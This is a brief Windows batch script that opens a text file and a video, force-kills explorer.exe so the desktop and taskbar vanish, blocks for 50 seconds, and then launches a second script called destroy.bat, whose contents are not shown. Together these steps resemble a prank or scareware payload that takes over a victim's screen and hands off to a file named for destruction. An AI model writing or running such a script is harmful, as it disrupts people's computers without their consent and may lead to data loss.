@echo off
start message.txt
start video.mp4
taskkill /im explorer.exe /f
timeout /t 50 /nobreak > nul
start destroy.bat
